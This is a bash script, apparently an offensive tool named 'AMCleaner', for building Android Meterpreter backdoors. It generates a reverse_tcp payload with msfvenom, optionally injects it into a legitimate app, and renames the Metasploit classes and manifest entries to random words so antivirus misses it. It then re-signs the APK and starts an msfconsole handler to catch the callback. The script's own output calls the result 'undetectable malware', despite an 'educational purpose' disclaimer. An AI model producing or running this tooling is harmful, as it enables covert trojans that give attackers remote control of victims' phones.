#!/bin/bash

source "$(dirname $0)/utils.sh"


Usage() {
    echo 
    echo "          *****************************************************************"
    echo "          *                                                               *"
    echo "          *    Author      =>  Abdallah Mohamed                           *"
    echo "          *    Tool        =>  Android Meterpreter Obfuscator             *"
    echo "          *    Greetz to   =>  Riddef, Ghost5egy, 7AZ30AN                 *"
    echo "          *    Warning     =>  This tool is only for educational purpose  *"
    echo "          *                                                               *"
    echo "          *                                                               *"
    echo "          *    Usage   :                                                  *"
    echo "          *            ./AMCleaner.sh [options] Or -h , --help            *"
    echo "          *                                                               *"
    echo "          *****************************************************************"
    echo -e "\n"
}

Help() {
    echo
    echo "-h , --help                                   Display Help menu"
    echo "-i=input.apk , --input=...                    Enter your meterpreter apk path"
    echo "-g=PayloadName.apk , --generate=...           For generate payload"
    echo "-p=payload_type , --payload=...               Payload type ex(android/meterpreter/reverse_tcp)"
    echo "-O=options , --options=...                    Payload options ex(\"LHOST=... LPORT=...\")"
    echo "-x=real_app.apk                               Enter app path to inject payload into"
    echo "--icon=icon.png                               Your icon path"
    echo "--runmsf                                      Run msfconsole"
    echo -e "\n"
    echo "Examples :"
    echo "      ./AMCleaner.sh -i path/to/meterpreter.apk -o clean_meterpreter.apk"
    echo
    echo "      ./AMCleaner.sh -i path/to/meterpreter.apk --icon path/to/icon.png -o clean_meterpreter.apk"
    echo
    echo "      ./AMCleaner.sh -g payload.apk -p android/meterpreter/reverse_tcp -O \"LHOST=192.168.1.4 LPORT=1111\" --icon path/to/icon.png -o path/to/clean_backdoor.apk"
    echo
    echo "      ./AMCleaner.sh -g payload.apk -p android/meterpreter/reverse_tcp -O \"LHOST=192.168.1.4 LPORT=1111\" -x path/to/real.apk -o path/to/clean_backdoor.apk"
    echo
}

CheckDependencies() {
    if ! CheckCommandExist "apktool"; then
        print_fail "'apktool' does not exist !"
        print_indicate "you must install via this command 'apt-get install apktool'"
        exit
    fi

    if ! CheckCommandExist "keytool"; then
        print_fail "'keytool' does not exist !"
        print_indicate "you must install via this command 'apt-get install keytool'"
        exit
    fi

    if ! CheckCommandExist "jarsigner"; then
        print_fail "'jarsigner' does not exist !"
        print_indicate "you must install via this command 'apt-get install jarsigner'"
        exit
    fi

    if ! CheckCommandExist "zipalign"; then
        print_fail "'zipalign' does not exist !"
        print_indicate "you must install via this command 'apt-get install zipalign'"
        exit
    fi

    if ! isFileExist "/usr/share/dict/words"; then
        print_fail "dict does not exist !"
        print_indicate "you must install via this command 'apt-get install --reinstall wamerican'"
        exit
    fi

    if ! CheckCommandExist "msfvenom"; then
        print_fail "'msfvenom' does not exist !"
        print_indicate "you must install & setup Metasploit framework"
        exit
    fi

}

ObfuscateBackdoor() {
    # Change the malicous strings
    sed -i "s/MainActivity/${APP_NAME%%.*}/g" $APP_DIR/res/values/strings.xml
    sed -i "2,22{N;N;s/\(.*\)\n\(.*\)\n\(.*\)/\3\n\2\n\1/};s/platformBuildVersionCode=\"10\"/platformBuildVersionCode=\"28\"/g;s/platformBuildVersionName=\"2.3.4\"/platformBuildVersionName=\"8.1.0\"/g;s/metasploit.stage/$METASPLOIT_SMALI_DIR.$STAGE_SMALI_DIR/g;s/metasploit/$MAIFEST_SCHEME/g;s/MainActivity/$MAIN_ACTIVITY/g;s/MainService/$MAIN_SERVICE/g;s/android:name=\".MainBroadcastReceiver\"/android:name=\".$MAIN_BROADCAST_RECEIVER\"/g" $APP_DIR/AndroidManifest.xml

    # Rename folders and files with unpredictable names
    mv $APP_DIR/smali/com/metasploit/ $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR;
    mv $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/stage $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR;
    mv $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/Payload.smali $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/$PAYLOAD_SMALI_FILE.smali;
    mv $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/MainActivity.smali $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/$MAIN_ACTIVITY.smali;
    mv $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/MainService.smali $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/$MAIN_SERVICE.smali;
    mv $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/MainBroadcastReceiver.smali $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/$MAIN_BROADCAST_RECEIVER.smali;

    sed -i "s/metasploit/$METASPLOIT_SMALI_DIR/g;s/stage/$STAGE_SMALI_DIR/g;s/MainActivity/$MAIN_ACTIVITY/g;s/MainService/$MAIN_SERVICE/g;s/MainBroadcastReceiver/$MAIN_BROADCAST_RECEIVER/g;s/Payload/$PAYLOAD_SMALI_FILE/g" $APP_DIR/smali/com/$METASPLOIT_SMALI_DIR/$STAGE_SMALI_DIR/*
} 

AddIcon() {
    sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/icon" >|g' $APP_DIR/AndroidManifest.xml
    
    if ! isDirExist "$APP_DIR/res/drawable-ldpi-v4"; then
        mkdir $APP_DIR/res/drawable-ldpi-v4
    fi

    if ! isDirExist "$APP_DIR/res/drawable-mdpi-v4"; then
        mkdir $APP_DIR/res/drawable-mdpi-v4 
    fi

    if ! isDirExist "$APP_DIR/res/drawable-hdpi-v4"; then
        mkdir $APP_DIR/res/drawable-hdpi-v4
    fi

    convert -resize 72x72 $ICON $APP_DIR/res/drawable-hdpi-v4/icon.png
    convert -resize 48x48 $ICON $APP_DIR/res/drawable-mdpi-v4/icon.png
    convert -resize 36x36 $ICON $APP_DIR/res/drawable-ldpi-v4/icon.png

    print_succeed "Icon Added"
}

CreateWorkspace() {
    print_status "Create Workspace" 

    if isDirExist "$SPACE"; then
        print_status "Workspace already initialized before !!!"
        
    else
        mkdir $SPACE
    fi
}

CleanWorkspace() {
    print_status "Clean Workspace"
    rm -rf $SPACE
}

SignBackdoor() {

    {
        # Interact with stdin and Set Keytool settings

        echo $(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
        echo $(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
        echo $(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
        echo $(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
        echo $(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
        echo $(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
        echo "yes"
    } | keytool -genkey -v -keystore $SPACE/${APP_NAME%%.*}.keystore -alias ${APP_NAME%%.*} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null

    if ! isFileExist "$SPACE/${APP_NAME%%.*}.keystore"; then
        print_fail "an error occured while signing "

        # Clean Workspace before exit
        CleanWorkspace
        exit
    else
        jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore $SPACE/${APP_NAME%%.*}.keystore $SPACE/temp.apk ${APP_NAME%%.*} &>/dev/null
        zipalign -f 4 $SPACE/temp.apk $SPACE/$APP_NAME

        print_succeed "Backdoor signed successfully"
    fi
}

RunMSF() {
    local options=""
    
    for val in $OPTIONS ; do
        if [[ $val == *"="* ]] ; then
            o=$(echo $val | cut -d '=' -f1);
            v=$(echo $val | cut -d '=' -f2);
            options+="set ${o} ${v}; "
        fi
    done 

    options+="set ExitOnSession false; "
    print_status "Execute 'msfconsole -x \"use exploit/multi/handler; set PAYLOAD $PAYLOAD; $options exploit -j\"'"
    
    msfconsole -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD; $options exploit -j"
}


Usage

while test $# -gt 0; do
    case "$1" in
        -h|--help)
            Help
            exit
            ;;

        -i|--input)
            shift
            export APP_PATH=$1
            shift
            ;;

        -o|--output)
            shift
            export CLEANED_APP_PATH=$1
            shift
            ;;

        -g|--generate)
            shift
            export GEN=$1
            shift
            ;;

        -p|--payload)
            shift
            export PAYLOAD=$1
            shift
            ;;

        -O|--options)
            shift
            export OPTIONS=$1
            shift
            ;;

        -x)
            shift
            export EMBEDED_APP=$1
            shift
            ;;

        -I|--icon)
            shift
            export ICON=$1
            shift
            ;;

        -r|--runmsf)
            shift
            export MSF="true"
            shift
            ;;
        
        *)
            exit
            ;;
    esac
done

CheckDependencies

if CheckStr "$APP_PATH"; then
    if ! isFileExist "$APP_PATH"; then
        print_fail "APK File does not exist !"
        exit
    fi

elif CheckStr "$GEN"; then
    if CheckStr "$PAYLOAD" && CheckStr "$OPTIONS"; then

        print_status "Try to generate APK meterpreter"

        if CheckStr "$EMBEDED_APP"; then
            if isFileExist "$EMBEDED_APP"; then
                msfvenom -x $EMBEDED_APP -p $PAYLOAD $OPTIONS -o $GEN &>/dev/null

                # If payload creation failed
                if ! isFileExist "$GEN"; then
                    print_fail "Failed to inject payload in APP"
                    exit
                else
                    print_succeed "Payload Injected in APP Successfully"
                fi

            else
                print_fail "'$EMBEDED_APP' does not exist !!"
                exit
            fi

        else
            msfvenom -p $PAYLOAD $OPTIONS -o $GEN &>/dev/null
        fi

        print_succeed "Your malware generated successfully"
        print_status "Original malware saved in '$GEN'"
        export APP_PATH=$GEN

    else
        print_fail "You must set (PAYLOAD type , PAYLOAD options)" 
        exit
    fi 

else
    exit
fi


APP_NAME=$(basename $APP_PATH)
SPACE="/tmp/obfuscator_work_space"
APP_DIR="$SPACE/$(echo $APP_NAME | cut -d '.' -f1)"
CLEANED_APP_DIR=$(dirname $CLEANED_APP_PATH)
METASPLOIT_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
STAGE_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
MAIFEST_SCHEME=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
MAIN_ACTIVITY=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
MAIN_SERVICE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
MAIN_BROADCAST_RECEIVER=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1) 
PAYLOAD_SMALI_FILE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)


CreateWorkspace

print_status "Decompile the detectable backdoor"
apktool d $APP_PATH -o $APP_DIR &>/dev/null

print_status "Obfuscate the backdoor"
ObfuscateBackdoor

# Handle Backdoor Icon 
# Check if icon option used and EMBEDED_APP option isn't used
if CheckStr "$ICON" && CheckStr "$EMBEDED_APP"; then 
    print_status "Try to add icon"

    if isFileExist "$ICON"; then
        AddIcon

    else
        print_fail "Icon does not exist !!"
    fi
fi

# Rebuild the clean backdoor
# save backdoor as temp.apk this will be changed in SignBackdoor function to $APP_NAME
print_status "Try to Rebuild the undetectable malware"
apktool b $APP_DIR -o $SPACE/temp.apk &>/dev/null

if isFileExist "$SPACE/temp.apk"; then
    print_succeed "Backdoor Rebuilded successfully"
    
else
    print_fail "Failed to Rebuild the backdoor"
    
    # Clean Workspace before exit
    CleanWorkspace
    exit
fi

# Sign the clean backdoor
print_status "Try to sign the backdoor"
SignBackdoor

# Save backdoor
if isFileExist "$SPACE/$APP_NAME"; then
    mv $SPACE/$APP_NAME $CLEANED_APP_PATH
    print_succeed "Cleaned backdoor saved in '$CLEANED_APP_PATH'"
fi

# Clean Workspace
CleanWorkspace

# Run metasploit if user want
if CheckStr "$MSF"; then
    # if payload or payload_options args not used
    if ! CheckStr "$PAYLOAD" || ! CheckStr "$OPTIONS"; then
        print_fail "Can't use 'msfconsole'"
        print_indicate "you must pass --payload <PAYLOAD_TYPE> and --options <PAYLOAD_OPTIONS>"

    elif CheckCommandExist "msfconsole"; then
        RunMSF

    else
        print_fail "'msfconsole' does not exist !"
        print_indicate "you must install & setup Metasploit framework"
    fi
fi
